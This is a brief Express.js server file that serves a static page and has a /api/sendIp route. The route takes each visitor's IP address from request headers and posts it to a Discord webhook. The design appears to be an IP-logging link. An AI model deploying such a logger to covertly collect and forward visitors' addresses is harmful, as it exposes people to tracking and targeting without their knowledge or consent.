const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Handle the root route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle the /api/sendIp route
app.get('/api/sendIp', (req, res) => {
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    const message = {
        content: `User IP: ${userIp}`
    };

    axios.post(DISCORD_WEBHOOK_URL, message)
        .then(response => {
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending IP to Discord:', error);
            res.status(500).json({ success: false, error: 'Internal Server Error' });
        });
});

// Export the app for Vercel
module.exports = app;
